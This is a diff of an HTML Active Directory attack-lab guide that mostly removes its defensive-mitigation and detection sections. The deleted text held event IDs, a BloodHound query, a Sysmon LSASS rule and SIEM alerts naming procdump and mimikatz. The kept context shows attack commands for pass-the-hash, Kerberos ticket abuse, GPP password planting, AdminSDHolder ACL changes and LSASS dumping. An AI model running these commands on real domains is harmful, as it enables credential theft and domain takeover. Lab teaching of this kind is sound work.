@@ -809,15 +809,6 @@ impacket-wmiexec fakeuser@MyDC.lab.local -k -no-pass
     <li>Bypasses Golden Ticket detection mechanisms.</li>
 </ol>
 
-<h2>Defensive Mitigations</h2>
-
-<ol>
-    <li>Restrict service account privileges.</li>
-    <li>Monitor for abnormal ticket lifetimes and tickets issued for non-existent users.</li>
-    <li>Rotate machine account passwords regularly.</li>
-</ol>
-
-
 
 <h1 id="GPP_Password_Extraction">GPP Password Extraction</h1>
 
@@ -875,9 +866,9 @@ $gpo = Get-GPO -Name "Default Domain Policy"
 $guid = $gpo.Id.Guid
 
 $xmlContent = @"
-<Groups>
-  <User name="GPPAdmin" cpassword="$cpassword" />
-</Groups>
+&lt;Groups&gt;
+  &lt;User name="GPPAdmin" cpassword="$cpassword" /&gt;
+&lt;/Groups&gt;
 "@
 
 $targetPath = "C:\Windows\SYSVOL\domain\Policies\{$guid}\Machine\Preferences"
@@ -897,7 +888,9 @@ $xmlContent | Out-File "$targetPath\Groups.xml" -Encoding UTF8
 
 <h1 id="ACL_Abuse">ACL Abuse</h1>
 
-<p>This section is intentionally left empty. ACL abuse depends heavily on the specific environment and privilege assignments.</p>
+<p>ACL abuse is highly dependent on the exact permissions and relationships present in each AD environment.
+In this lab, ACL-based attacks are already covered inside their corresponding scenarios (AdminSDHolder, RBCD, constrained delegation, etc.), where they naturally occur as part of the attack path.
+Therefore, this section is intentionally kept minimal instead of duplicating content.</p>
 
 <hr>
 
@@ -1083,13 +1076,6 @@ crackmapexec smb &lt;DC_IP&gt; -u Administrator -H &lt;NT_HASH&gt;
     </tr>
 </table>
 
-<h2>Defensive Mitigations</h2>
-
-<ol>
-    <li>Restrict DCSync permissions.</li>
-    <li>Monitor for Event ID 4662 with replication GUID <code>{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}</code>.</li>
-    <li>Audit accounts with replication rights using BloodHound.</li>
-</ol>
 
 <hr>
 
@@ -1250,20 +1236,6 @@ Get-ADUser svc_deleg -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDeleg
 
 <hr>
 
-<h2>Defensive Mitigations</h2>
-
-<ol>
-    <li>Audit delegation settings regularly.</li>
-    <li>Prefer resource-based constrained delegation.</li>
-    <li>Monitor Event ID 4769 with TicketOptions = 0x40810000.</li>
-</ol>
-
-<h2>Detection Events</h2>
-
-<ul>
-    <li><strong>Event ID 4769</strong>: Kerberos service ticket requested</li>
-    <li>Look for service account names such as <code>svc_deleg</code></li>
-</ul>
 
 
 
@@ -1581,40 +1553,6 @@ Set-ACL -Path "AD:$($adminSDHolder.DistinguishedName)" -AclObject $acl
 
 <hr>
 
-<h2>Defensive Mitigations</h2>
-
-<ol>
-    <li>Restrict access to AdminSDHolder and remove unnecessary permissions.</li>
-    <li>Monitor Event ID 5136 for changes to the AdminSDHolder object.</li>
-    <li>Regularly audit AdminSDHolder ACL to ensure only expected security principals have rights.</li>
-</ol>
-
-<pre><code>
-$acl = Get-ACL -Path "AD:\\CN=AdminSDHolder,CN=System,DC=lab,DC=local"
-$acl.Access |
-    Where-Object {$_.IdentityReference -notlike "NT AUTHORITY*"}
-</code></pre>
-
-<hr>
-
-<h2>Detection Tips</h2>
-
-<p><strong>BloodHound Query:</strong></p>
-
-<pre><code>
-MATCH (u:User)-[r:WriteDacl|GenericAll]->(c:Container {name: "AdminSDHolder"})
-RETURN u, r, c
-</code></pre>
-
-<p><strong>SIEM Alerts:</strong></p>
-<ul>
-    <li>Unexpected modifications to the AdminSDHolder object</li>
-    <li>Frequent or unusual permission changes to protected groups</li>
-</ul>
-
-
-
-
 
 <h1 id="LSASS_Dump">LSASS Dump</h1>
 
@@ -1744,49 +1682,6 @@ Expand-Archive -Path "procdump.zip" -DestinationPath "C:\Tools\"
 </table>
 
 <hr>
-
-<h2>Defensive Mitigations</h2>
-
-<ol>
-    <li>Enable LSA protection.</li>
-</ol>
-
-<pre><code>
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
-</code></pre>
-
-<ol start="2">
-    <li>Configure Credential Guard where possible.</li>
-</ol>
-
-<pre><code>
-Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Hyper-V" -All
-Enable-WindowsOptionalFeature -Online -FeatureName "CredentialGuard" -All
-</code></pre>
-
-<ol start="3">
-    <li>Monitor access to LSASS using process access logging (for example, Sysmon Event ID 10).</li>
-</ol>
-
-<hr>
-
-<h2>Detection Tips</h2>
-
-<p><strong>Sysmon Configuration Example:</strong></p>
-
-<pre><code>
-&lt;ProcessAccess onmatch="include"&gt;
-  &lt;TargetImage condition="end with"&gt;lsass.exe&lt;/TargetImage&gt;
-&lt;/ProcessAccess&gt;
-</code></pre>
-
-<p><strong>SIEM Alerts:</strong></p>
-<ul>
-    <li>Execution of tools such as procdump.exe or mimikatz.exe</li>
-    <li>Repeated access to the LSASS process by non-system processes</li>
-</ul>
-
-
 
 
 
